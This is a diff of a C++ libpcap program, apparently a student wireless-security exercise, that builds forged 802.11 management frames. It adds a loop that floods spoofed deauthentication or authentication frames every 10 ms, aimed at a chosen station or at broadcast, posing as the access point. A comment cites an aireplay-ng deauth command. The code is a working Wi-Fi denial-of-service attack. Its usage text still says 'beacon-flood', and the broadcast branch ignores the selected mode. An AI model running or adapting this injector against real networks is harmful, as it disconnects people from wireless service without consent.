@@ -34,35 +34,53 @@ struct Frame80211 {
     uint16_t sequence_control;
 };
 
-// 맥 주소 구조체 (단순화)
-// struct MacAddress {
-//     uint8_t addr[6];
-// };
-// #pragma pack(pop)
-
-// // 문자열을 MAC 주소로 변환하는 함수
-// MacAddress parse_mac(const char* mac_str) {
-//     MacAddress mac{};
-//     int values[6];
-
-//     if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
-//                &values[0], &values[1], &values[2], 
-//                &values[3], &values[4], &values[5]) != 6) {
-//         std::cerr << "Invalid MAC address format: " << mac_str << std::endl;
-//         exit(EXIT_FAILURE);
-//     }
-
-//     for (int i = 0; i < 6; i++) {
-//         mac.addr[i] = static_cast<uint8_t>(values[i]);
-//     }
-//     return mac;
-// }
-
 // 간단한 사용법 출력
 void usage() {
     printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
     printf("sample : beacon-flood mon0 ssid-list.txt\n");
 }
+
+// 패킷 생성 함수
+void make_packet(uint8_t* packet, const MacAddress& src_mac, const MacAddress& dest_mac, uint8_t subtype) {
+    // Radiotap Header 설정
+    RadiotapHeader rth;
+    memset(&rth, 0, sizeof(rth));
+    rth.version = 0;
+    rth.pad = 0;
+    rth.length = sizeof(RadiotapHeader);
+    rth.present = 0;
+
+    // Frame80211 설정
+    Frame80211 deauth_frame{};
+    deauth_frame.version = 0; // Protocol version
+    deauth_frame.type = 0;    // Management frame
+    deauth_frame.subtype = subtype; // Subtype (Deauthentication)
+    deauth_frame.flags = 0;   // Default flags
+    deauth_frame.duration = 0; // Default duration
+    deauth_frame.address1 = dest_mac;
+    deauth_frame.address2 = src_mac;
+    deauth_frame.address3 = src_mac;
+    deauth_frame.sequence_control = 0; // Default sequence control
+
+    // Fixed Parameters 설정
+    uint8_t fixed_params[12] = {0x00, 0x07};
+
+    // 패킷 구성
+    size_t offset = 0;
+
+    // Radiotap Header 복사
+    memcpy(packet + offset, &rth, sizeof(rth));
+    offset += sizeof(rth);
+
+    // 802.11 Frame Header 복사
+    memcpy(packet + offset, &deauth_frame, sizeof(deauth_frame));
+    offset += sizeof(deauth_frame);
+
+    // Fixed Parameters 복사
+    memcpy(packet + offset, fixed_params, sizeof(fixed_params));
+}
+
+// aireplay-ng wlan -c 10 -a <AP address>
 
 int main(int argc, char* argv[]) {
     if (argc < 3 || argc > 5) {
@@ -85,20 +103,6 @@ int main(int argc, char* argv[]) {
             deauth_or_auth = true;
         }
     }
-
-    // 입력 정보 출력
-    cout << "Interface: " << interface << std::endl;
-    cout << "AP MAC: ";
-    print_mac(ap_mac);
-    cout << std::endl;
-
-    if (has_station_mac) {
-        cout << "Station MAC: ";
-        print_mac(station_mac);
-        cout << std::endl;
-    }
-
-    cout << "Mode: " << (deauth_or_auth ? "Auth" : "Deauth") << std::endl;
     //==================================================================//
 
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -108,54 +112,34 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-     // Radiotap 헤더 설정
-    RadiotapHeader rth;
-    memset(&rth, 0, sizeof(rth));
-    rth.version = 0;
-    rth.pad = 0;
-    rth.length = sizeof(RadiotapHeader); 
-    rth.present = 0;
-
-    // Frame80211 초기화
-    MacAddress broadcast = make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
-    Frame80211 deauth_frame{};
-    deauth_frame.version = 0; // Protocol version
-    deauth_frame.type = 0;    // Management frame
-    deauth_frame.subtype = 12; // Deauthentication subtype
-    deauth_frame.flags = 0;   // Default flags
-    deauth_frame.duration = 0; // Default duration
-    deauth_frame.address1 = broadcast;
-    deauth_frame.address2 = ap_mac;
-    deauth_frame.address3 = ap_mac;
-    deauth_frame.sequence_control = 0; // Default sequence control
-
-    // Beacon Fixed Parameter 
-    uint8_t fixed_params[12] = {0x00, 0x07};
     
-    //make packet!!
     uint8_t packet[256];
-    size_t offset = 0;
-
-    // Radiotap Header 복사
-    memcpy(packet + offset, &rth, sizeof(rth));
-    offset += sizeof(rth);
-
-    // 802.11 Frame Header 복사
-    memcpy(packet + offset, &deauth_frame, sizeof(deauth_frame));
-    offset += sizeof(deauth_frame);
-
-    // Fixed Parameters 복사
-    memcpy(packet + offset, fixed_params, sizeof(fixed_params));
-    offset += sizeof(fixed_params);
 
     // 반복 전송
     while (true) {
-        // 패킷 전송
-        if (pcap_sendpacket(pcap, packet, offset) != 0) {
-            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
+        if (has_station_mac){
+            uint8_t packet2[256];
+            make_packet(packet, ap_mac, station_mac, deauth_or_auth ? 0x0b : 0x0c);
+            make_packet(packet2, station_mac, ap_mac, deauth_or_auth ? 0x0b : 0x0c);
+            // 패킷 전송
+            if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
+                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
+            }
+            usleep(10000); 
+            if (pcap_sendpacket(pcap, packet2, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
+                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
+            }
+            usleep(10000); 
+        } else{
+            make_packet(packet, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), 0x0b );
+
+            // 패킷 전송
+            if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
+                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
+            }
+            usleep(10000); 
         }
-        usleep(10000); 
     }
-    pcap_close(pcap);
+
     return 0;
 }
